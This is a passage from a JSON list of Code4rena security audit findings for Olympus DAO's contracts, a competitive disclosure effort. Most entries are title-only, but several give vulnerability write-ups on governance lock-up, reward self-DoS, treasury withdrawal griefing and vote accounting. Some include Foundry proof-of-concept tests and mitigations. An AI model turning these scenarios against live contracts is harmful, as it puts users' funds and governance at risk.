data is accepted, as the time frame of only observation frequency (multiplied by 1) may not be enough for the oracle to realistically update its data.  (In other words, the frequency of new price information might be lower than the observation frequency, which is probably the case as third multiple is used for the OHM price).  If this is the case, this inconsistency may lead to the `getCurrentPrice()` reverting as while third multiple of the observation frequency might give enough space for the first oracle, second oracle's first multiple of frequency time frame might not be enough and it couldn't pass the staleness check due to unrealistic expectation of freshness.   ## Tools Used Manual review, talking with devs  ## Recommended Mitigation Steps Change the line 171 to  ```             if (updatedAt < block.timestamp - 3 * uint256(observationFrequency)) ``` like line 165. "}, {"title": "TRSRY:getLoan() is permissioned, but no policy has permission to call it", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/389", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-08-olympus-findings", "body": "TRSRY:getLoan() is permissioned, but no policy has permission to call it"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/387", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/385", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/384", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "No Cap on Amount of VOTES means the `voter_admin` can get any proposal to pass", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/380", "labels": ["bug", "2 (Med Risk)", "sponsor disputed"], "target": "2022-08-olympus-findings", "body": "No Cap on Amount of VOTES means the `voter_admin` can get any proposal to pass"}, {"title": "Inconsistant parameter requirements between `constructor()` and `Set() functions` in `RANGE.sol` and `Operator.sol`.", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/379", "labels": ["bug", "2 (Med Risk)", "disagree with severity"], "target": "2022-08-olympus-findings", "body": "Inconsistant parameter requirements between `constructor()` and `Set() functions` in `RANGE.sol` and `Operator.sol`."}, {"title": "Heart will stop if all rewards are swept", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/378", "labels": ["bug", "2 (Med Risk)", "high quality report", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L110-L115   # Vulnerability details  Rewards for Heart `beat` are sent via `_issueReward`  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L110-L115  ```solidity      function _issueReward(address to_) internal {         rewardToken.safeTransfer(to_, reward);         emit RewardIssued(to_, reward);     }  ```  The function doesn't check for available tokens e.g. `min(reward, rewardToken.balanceOf(address(this)));`   In case of calling `withdrawUnspentRewards`  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L149-L152  ```solidity     /// @inheritdoc IHeart     function withdrawUnspentRewards(ERC20 token_) external onlyRole(\"heart_admin\") {         token_.safeTransfer(msg.sender, token_.balanceOf(address(this)));     } ```  Because the function withdraws the entire amount, the heart will stop until a caller incentive is deposited again.  While a profitable searches will stop calling the Heart without an incentive, allowing the heart to beat when no rewards are available is preferable to having it self-DOS until a DAO aligned caller donates `rewardToken` or the DAO deals with the lack of tokens.  ## Remediation  Add a check for available tokens `min(reward, rewardToken.balanceOf(address(this)));`"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/377", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "In `Governance.sol`, it might be impossible to activate a new proposal forever after failed to execute the previous active proposal.", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/376", "labels": ["bug", "duplicate", "3 (High Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221 https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L302-L304   # Vulnerability details  ## Impact Currently, if users vote for the active proposal, the `VOTES` are transferred to the contract so that users can't vote or endorse other proposals while the voted proposal is active.  And the active proposal can be replaced only when the proposal is executed successfully or another proposal is activated after `GRACE_PERIOD`.  But `activateProposal()` requires at least 20% endorsements [here](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221), so it might be impossible to activate a new proposal forever if the current active proposal involves more than 80% of total votes.   ## Proof of Concept The below scenario would be possible. 1. `Proposal 1` was submitted and activated successfully. 2. Let's assume 81% of the total votes voted for this proposal. `Yes = 47%`, `No = 34%` 3. This proposal can't be executed for [this requirement](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268-L270) because `47% - 34% = 13% < 33%`. 4. Currently the contract contains more than 81% of total votes and users have at most 19% in total. 5. Also users can't reclaim their votes among 81% while `Proposal 1` is active. 6. So even if a user who has 1% votes submits a new proposal, it's impossible to activate because of this [require()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221). 7. So it's impossible to delete `Proposal 1` from an active proposal and there won't be other active proposal forever.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps I think we should add one more constant like `EXECUTION_EXPIRE = 2 weeks` so that voters can reclaim their votes after this period even if the proposal is active.  I am not sure we can use the current `GRACE_PERIOD` for that purpose.  So `reclaimVotes()` should be modified like below.  ``` function reclaimVotes(uint256 proposalId_) external {     uint256 userVotes = userVotesForProposal[proposalId_][msg.sender];      if (userVotes == 0) {         revert CannotReclaimZeroVotes();     }      if (proposalId_ == activeProposal.proposalId) {         if (block.timestamp < activeProposal.activationTimestamp + EXECUTION_EXPIRE) //+++++++++++++++++++++++++++++++++         {             revert CannotReclaimTokensForActiveVote();         }     }      if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {         revert VotingTokensAlreadyReclaimed();     }      tokenClaimsForProposal[proposalId_][msg.sender] = true;      VOTES.transferFrom(address(this), msg.sender, userVotes); } ```"}, {"title": "The governance system can be held hostage by a malicious user", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/375", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-08-olympus-findings", "body": "The governance system can be held hostage by a malicious user"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/374", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/373", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/372", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Missing checks in `Kernel._deactivatePolicy`", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/368", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325   # Vulnerability details  ## Impact There are no checks to ascertain that the policy being removed is registered in the `Kernel`. Trying to remove a non-registered results in the policy registered at 0th index of `activePolicies` being removed.   ## Proof of Concept https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325  ## Recommended Mitigation Steps Adding `require(activePolicies[idx] == policy_, \"Unregistered policy\");` will prevent this, where `idx = getPolicyIndex[policy_]`.  **NOTE:** The issue is less likely to happen as this is handled solely by the executor, but having safeguards in the contract is always better than relying on an external factor. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/365", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Unrestricted access for configureDependencies in all the policies. Anyone can call the configureDependencies ", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/364", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "Unrestricted access for configureDependencies in all the policies. Anyone can call the configureDependencies "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/363", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/361", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/360", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/359", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/357", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/356", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/354", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/353", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/330", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/327", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/326", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/325", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/324", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/323", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/321", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/320", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/319", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Griefing/DOS of withdrawals by EOAs from treasury (TRSRY) possible", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/317", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L53-L67   # Vulnerability details  ## Impact Any withdrawals from the treasury by an approved EOA can be denied by a malicious actor that watches the mempool.  ## Proof of Concept The function TreasuryCustodian.revokePolicyApprovals() doesnt provide sufficient checks for its intended purpose of \"revoking a deactivated policy's approvals\". As can be seen by the TODO labels, the issue has already been acknowledged by the team (regardless it is still an issue present in an in-scope contract). The only check performed is trying to call the isActive()-function on an address and interpret the returned value as boolean. Attempting to call this function on an EOA will not fail and return 0 (=false). Hence the condition to revert is not fulfilled and the amounts approved to withdraw will be set to 0.   ## Tools Used  IDE (Remix, VSCode)  ## Recommended Mitigation Steps  A partial but insufficient fix would be to check if the address passed to the function contains code and hence is not an EOA. A better approach might be to add a mapping(address => bool) of all addresses that have been active policies some time in the past to the kernel, something like this:  As a public variable in Kernel.sol `mapping(address => bool) public isRegisteredPolicy;`  in Kernel.activatePolicy(): `isRegisteredPolicy[address(policy_)] ) = true;`  and finally in TreasuryCustodian.revokePolicyApprovals(): `if(!kernel.isRegisteredPolicy(policy_) revert NotARegisteredPolicy`"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/316", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/312", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/311", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/310", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "OlympusGovernance: Users can prevent their votes from being revoked", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/308", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-08-olympus-findings", "body": "OlympusGovernance: Users can prevent their votes from being revoked"}, {"title": "TRSRY.sol function repayLoan() alows only loan owner to repay loan", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/307", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L104-L119   # Vulnerability details  ### TRSRY.sol alows only loan owner to repay loan  It should be allowed that that everyone can repay the loan. There could be a situation that loan owner is not able to repay the loan but a different address could repay in his place. It seems as unnecessary restriction that only the owner can repay his loan.  **Recommendation**: Allow everyone to repay any loan. Context: [`TRSRY.sol#L104-L119`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L104-L119) ```diff= -    function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant { -        if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();          // Deposit from caller first (to handle nonstandard token transfers)         uint256 prevBalance = token_.balanceOf(address(this));         token_.safeTransferFrom(msg.sender, address(this), amount_);          uint256 received = token_.balanceOf(address(this)) - prevBalance;          // Subtract debt from caller -        reserveDebt[token_][msg.sender] -= received;         totalDebt[token_] -= received;  -        emit DebtRepaid(token_, msg.sender, received);     } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/306", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/305", "labels": ["bug", "high quality report", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/297", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/296", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/294", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/291", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/289", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/288", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/284", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/282", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/280", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Voted votes cannot change after the user are issued with new votes or the user's old votes are revoked during voting", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/275", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56   # Vulnerability details  ## Impact A user can call the following `vote` function to vote for a proposal. During voting, the voter admin can still call the `issueVotesTo` and `revokeVotesFrom` functions below to issue new votes or revoke old votes for the user, which also changes the votes' total supply during the overall voting. Because each user can only call `vote` once for a proposal due to the `userVotesForProposal[activeProposal.proposalId][msg.sender] > 0` conditional check, the old voted votes, resulted from the `vote` call by the user, will be used to compare against the new total supply of the votes, resulted from the `issueVotesTo` and `revokeVotesFrom` calls during the overall voting, when determining whether the proposal can be executed or not. Because of this inconsistency, the result on whether the proposal can be executed might not be reliable.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262 ```solidity     function vote(bool for_) external {         uint256 userVotes = VOTES.balanceOf(msg.sender);          if (activeProposal.proposalId == 0) {             revert NoActiveProposalDetected();         }          if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {             revert UserAlreadyVoted();         }          if (for_) {             yesVotesForProposal[activeProposal.proposalId] += userVotes;         } else {             noVotesForProposal[activeProposal.proposalId] += userVotes;         }          userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;          VOTES.transferFrom(msg.sender, address(this), userVotes);          emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48 ```solidity     function issueVotesTo(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {         // Issue the votes in the VOTES module         VOTES.mintTo(wallet_, amount_);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56 ```solidity     function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {         // Revoke the votes in the VOTES module         VOTES.burnFrom(wallet_, amount_);     } ```  ## Proof of Concept Please add the following code in `src\\test\\policies\\Governance.t.sol`.  First, please add the following code for `stdError`. ```solidity import {Test, stdError} from \"forge-std/Test.sol\";    // @audit import stdError for testing purpose ```  Then, please append the following tests. These tests will pass to demonstrate the described scenarios. ```solidity     function testScenario_UserCannotVoteAgainWithNewlyMintedVotes() public {         _createActiveProposal();          // voter3 votes for the proposal         vm.prank(voter3);         governance.vote(true);          assertEq(governance.yesVotesForProposal(1), 300);         assertEq(governance.noVotesForProposal(1), 0);          assertEq(governance.userVotesForProposal(1, voter3), 300);         assertEq(VOTES.balanceOf(voter3), 0);         assertEq(VOTES.balanceOf(address(governance)), 300);          // to simulate calling VoterRegistration.issueVotesTo that mints votes to voter3, VOTES.mintTo is called by godmode here         vm.prank(godmode);         VOTES.mintTo(voter3, 500);         assertEq(VOTES.balanceOf(voter3), 500);          // calling vote function again by voter3 reverts, which means that voter3 cannot additionally vote with the 500 newly minted votes         vm.expectRevert(UserAlreadyVoted.selector);         vm.prank(voter3);         governance.vote(true);     } ```  ```solidity     function testScenario_RevokeVotesAfterUserFinishsOwnVoting() public {         _createActiveProposal();          // voter3 votes for the proposal         vm.prank(voter3);         governance.vote(true);          assertEq(governance.yesVotesForProposal(1), 300);         assertEq(governance.noVotesForProposal(1), 0);          assertEq(governance.userVotesForProposal(1, voter3), 300);         assertEq(VOTES.balanceOf(voter3), 0);         assertEq(VOTES.balanceOf(address(governance)), 300);          // To simulate calling VoterRegistration.revokeVotesFrom that burns voter3's votes, VOTES.burnFrom is called by godmode here.         // However, calling VOTES.burnFrom will revert due to arithmetic underflow.         vm.prank(godmode);         vm.expectRevert(stdError.arithmeticError);         VOTES.burnFrom(voter3, 300);          // the proposal is still voted with voter3's previous votes afterwards         assertEq(governance.userVotesForProposal(1, voter3), 300);         assertEq(VOTES.balanceOf(voter3), 0);         assertEq(VOTES.balanceOf(address(governance)), 300);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps When `issueVotesTo` and `revokeVotesFrom` are called during voting, the corresponding votes need to be added to or removed from the proposal's voted votes for the user. Alternatively, `issueVotesTo` and `revokeVotesFrom` can be disabled when an active proposal exists."}, {"title": "`activateProposal()` need time delay", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/273", "labels": ["bug", "2 (Med Risk)", "sponsor disputed"], "target": "2022-08-olympus-findings", "body": "`activateProposal()` need time delay"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/269", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/268", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "\"TWAP\" used is an observation-weighted-average-price, not a time-weighted one", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/267", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "\"TWAP\" used is an observation-weighted-average-price, not a time-weighted one"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/263", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/261", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/260", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Endorsed votes by a user do not decrease after the user's votes are revoked", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/257", "labels": ["bug", "duplicate", "2 (Med Risk)", "sponsor acknowledged", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "Endorsed votes by a user do not decrease after the user's votes are revoked"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/252", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/251", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/250", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/249", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/242", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/241", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "After endorsing a proposal, user can transfer votes to another user for endorsing the same proposal again", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/239", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-08-olympus-findings", "body": "After endorsing a proposal, user can transfer votes to another user for endorsing the same proposal again"}, {"title": "setDebt function of TRSRY.sol has no comparison of financial values and sets/erase debts for arbitrary addresses for arbitrary amounts", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/238", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-08-olympus-findings", "body": "setDebt function of TRSRY.sol has no comparison of financial values and sets/erase debts for arbitrary addresses for arbitrary amounts"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/237", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/233", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "QA Report"}]